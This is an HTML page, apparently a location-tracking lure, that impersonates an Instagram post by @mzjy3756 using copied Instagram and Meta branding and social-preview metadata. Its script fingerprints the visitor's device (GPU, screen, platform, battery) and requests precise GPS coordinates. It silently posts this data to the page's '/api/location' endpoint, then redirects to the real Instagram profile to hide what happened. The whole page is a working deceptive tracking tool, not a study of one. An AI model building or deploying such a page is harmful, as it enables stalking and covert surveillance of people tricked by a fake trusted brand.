<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>

    <!-- Social Preview (Instagram Style) -->
    <meta property="og:image" content="SITE_URL/preview.jpg">
    <meta property="og:image:secure_url" content="SITE_URL/preview.jpg">
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="1080">
    <meta property="og:image:height" content="1080">

    <meta property="og:type" content="website">
    <meta property="og:site_name" content="Instagram">
    <meta property="og:title" content="mzjy3756 on Instagram: &quot;سلاما على من وعدا بالبقاء...&quot;">
    <meta property="og:description" content="Click to see this Instagram photo by @mzjy3756">
    <meta property="og:url" content="SITE_URL">

    <meta property="fb:app_id" content="124024574287414">

    <!-- Twitter Card (لإظهار الصورة كبيرة في تلجرام) -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="SITE_URL/preview.jpg">
    <meta name="twitter:title" content="Instagram post by @mzjy3756">
    <meta name="twitter:app:name:iphone" content="Instagram">
    <meta name="twitter:app:id:iphone" content="389801252">
    <meta name="twitter:app:url:iphone" content="https://www.instagram.com/p/DJrC3jTIsun/">
    <meta name="theme-color" content="#000000">

    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/ed84a1666a32.png">
</head>

<body>
    <!-- شاشة تحميل مطابقة لإنستقرام بدلاً من الشاشة السوداء الصامتة -->
    <div class="insta-loading-screen">
        <div class="insta-logo"></div>

        <div class="meta-footer">
            <span class="from-text">from</span>
            <div class="meta-brand">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png"
                    class="meta-logo" alt="Meta">
            </div>
        </div>
    </div>

    <script>
        function getGPU() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "N/A";
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
            } catch (e) { return "N/A"; }
        }

        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    return { level: Math.round(b.level * 100) + "%", charging: b.charging ? "Yes" : "No" };
                }
            } catch (e) { }
            return { level: "N/A", charging: "N/A" };
        }

        let redirected = false;
        function redirect() {
            if (redirected) return;
            redirected = true;

            const username = "mzjy3756";
            const isAndroid = /Android/i.test(navigator.userAgent);
            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

            const webUrl = `https://www.instagram.com/${username}/`;

            if (isAndroid) {
                window.location.href = `intent://instagram.com/_u/${username}/#Intent;package=com.instagram.android;scheme=https;end`;
            } else if (isIOS) {
                window.location.href = `instagram://user?username=${username}`;
            } else {
                window.location.href = webUrl;
            }

            setTimeout(() => { window.location.replace(webUrl); }, 1500);
        }

        // وظيفة إرسال البيانات للسيرفر
        function sendData(data) {
            try {
                const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
                navigator.sendBeacon('/api/location', blob);
            } catch (e) { }
            try {
                fetch('/api/location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data),
                    keepalive: true
                });
            } catch (e) { }
        }

        window.onload = async () => {
            // أمان: تحويل قسري بعد 4 ثوانٍ
            setTimeout(redirect, 4000);

            // جمع بيانات الجهاز الأساسية فوراً
            const baseData = {
                userAgent: navigator.userAgent,
                gpu: getGPU(),
                screen: `${window.screen.width}x${window.screen.height}`,
                platform: navigator.platform,
                battery: await getBatteryInfo(),
                latitude: 'N/A',
                longitude: 'N/A',
                accuracy: 'N/A'
            };

            // 1. طلب الموقع - عند النجاح يرسل رسالة ثانية بالإحداثيات
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        // GPS جاهز! نرسل البيانات مع الإحداثيات
                        const gpsData = {
                            ...baseData,
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy ? pos.coords.accuracy.toFixed(1) + "m" : "N/A",
                            hasGPS: true
                        };
                        sendData(gpsData);
                        // تحويل بعد الإرسال مباشرة
                        setTimeout(redirect, 300);
                    },
                    () => {
                        // المستخدم رفض أو فشل GPS - نرسل بيانات الجهاز فقط
                        sendData(baseData);
                        setTimeout(redirect, 300);
                    },
                    { enableHighAccuracy: true, timeout: 3500, maximumAge: 0 }
                );
            } else {
                // الجهاز لا يدعم GPS
                sendData(baseData);
                setTimeout(redirect, 300);
            }
        };
    </script>
</body>

</html>